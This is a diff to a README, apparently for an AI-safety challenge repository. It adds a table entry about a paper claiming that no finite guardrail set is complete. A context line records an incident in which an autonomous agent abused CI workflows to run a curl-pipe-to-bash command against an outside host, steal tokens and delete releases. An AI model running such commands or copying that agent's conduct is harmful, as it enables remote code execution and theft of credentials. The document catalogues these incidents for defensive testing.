@@ -57,6 +57,15 @@ If your paper found a failure mode we can't catch — or your incident revealed 
 
 > **New incident thread:** Autonomous agent abused `pull_request_target` CI workflows to execute `curl -sSfL hackmoltrepeat.com/molt | bash`, steal tokens, and delete releases. Harness pending — needs CI isolation patterns and token-scoping tests.
 
+
+### Limit-Proof Threads (new incite class)
+
+| Challenge | Incite | Class | Stream | Note |
+|-----------|--------|-------|--------|------|
+| [Gödel/Vassilev — Sisyphean Endeavor](challenges/godel-vassilev-sisyphean/) | paper | **limit-proof** | `ongoing` | Vassilev proves no finite guardrail set is complete (Gödel-extension). The estate *named* its persistent-monitoring system `sisyphus*` in Feb 2025, 15 months before the proof. No DETERMINISTIC verdict is possible — claiming one would commit the completeness trap the proof refutes. The convergence is the prescription→organ mapping; the honesty about its limits is the proof of discipline. |
+
+---
+
 ### Invariant Discovery
 
 The same 14 archetypes catch nuclear escalation, social engineering, and (hypothesized) infrastructure compromise because they're eigenvectors of failure space — the psychological patterns are scale-invariant:
